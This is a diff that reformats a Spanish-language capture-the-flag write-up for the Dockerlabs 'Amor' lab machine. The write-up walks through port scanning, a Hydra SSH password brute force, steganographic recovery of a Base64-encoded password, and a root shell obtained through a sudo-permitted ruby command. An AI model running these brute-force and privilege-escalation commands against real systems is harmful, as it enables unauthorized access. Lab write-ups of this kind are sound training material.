@@ -1,22 +1,30 @@
-# 🖥️ Writeup - Amor 
+---
+icon: linux
+---
 
-**Plataforma:** Dockerlabs  
-**Sistema Operativo:** Linux  
+# Amor ​​
+
+## 🖥️ Writeup - Amor
+
+**Plataforma:** Dockerlabs\
+**Sistema Operativo:** Linux
 
 > **Tags:** `Linux` `Steganography` `Hydra` `Information Leakage` `Base64` `Sudoers` `Ruby`
 
-# INSTALACIÓN
+## INSTALACIÓN
 
 Descargamos el `.zip` de la máquina desde DockerLabs a nuestro entorno y seguimos los siguientes pasos.
 
-```bash 
+```bash
 unzip amor.zip
 ```
+
 La máquina ya está descomprimida y solo falta montarla.
 
 ```bash
 sudo bash auto_deploy.sh amor.tar
-``` 
+```
+
 Info:
 
 ```
@@ -41,23 +49,24 @@ Estamos desplegando la máquina vulnerable, espere un momento.
 Máquina desplegada, su dirección IP es --> 172.17.0.2
 
 Presiona Ctrl+C cuando termines con la máquina para eliminarla
-``` 
+```
 
 Una vez desplegada, cuando terminemos de hackearla, con un `Ctrl + C` se eliminará automáticamente para que no queden archivos residuales.
 
-# ESCANEO DE PUERTOS
+## ESCANEO DE PUERTOS
 
 A continuación, realizamos un escaneo general para comprobar qué puertos están abiertos y luego uno más exhaustivo para obtener información relevante sobre los servicios.
 
 ```bash
 nmap -n -Pn -sS -sV -p- --open --min-rate 5000 172.17.0.2
-``` 
+```
 
 ```bash
 nmap -n -Pn -sCV -p22,80 --min-rate 5000 172.17.0.2
 ```
 
 Info:
+
 ```
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-13 15:38 CEST
 Nmap scan report for 172.17.0.2
@@ -94,13 +103,14 @@ Podemos deducir que `carlota` es un usuario válido del sistema de la empresa, m
 
 Como no encontramos nada haciendo `fuzzing` de directorios, intentamos un ataque de fuerza bruta sobre el puerto `SSH` con el usuario `carlota`.
 
-# FUERZA BRUTA
+## FUERZA BRUTA
 
 ```bash
 hydra -l carlota -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 60
 ```
 
 Info:
+
 ```
 Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
@@ -120,7 +130,7 @@ Accedemos por `SSH`.
 ssh carlota@172.17.0.2
 ```
 
-# ESCALDA DE PRIVILEGIOS
+## ESCALDA DE PRIVILEGIOS
 
 Una vez dentro, comprobamos permisos `sudo` y `SUID`.
 
@@ -133,6 +143,7 @@ scp carlota@172.17.0.2:/home/carlota/Desktop/fotos/vacaciones/imagen.jpg .
 ```
 
 Info:
+
 ```
 carlota@172.17.0.2's password: 
 imagen.jpg                                                            100%   51KB  29.6MB/s   00:00
@@ -147,6 +158,7 @@ steghide extract -sf imagen.jpg
 Se nos pide una passphrase y la dejamos en blanco.
 
 Info:
+
 ```
 Enter passphrase: 
 wrote extracted data to "secret.txt".
@@ -163,7 +175,9 @@ Al revisar su contenido obtenemos un string en `Base64`, que debemos decodificar
 ```bash
 echo "ZXNsYWNhc2FkZXBpbnlwb24=" | base64 -d
 ```
+
 Info:
+
 ```
 eslacasadepinypon
 ```
@@ -183,6 +197,7 @@ sudo -l
 ```
 
 Info:
+
 ```
 Matching Defaults entries for oscar on 8deed0004059:
     env_reset, mail_badpass,
@@ -199,6 +214,7 @@ sudo ruby -e 'exec "/bin/sh"'
 ```
 
 Info:
+
 ```
 # whoami
 root
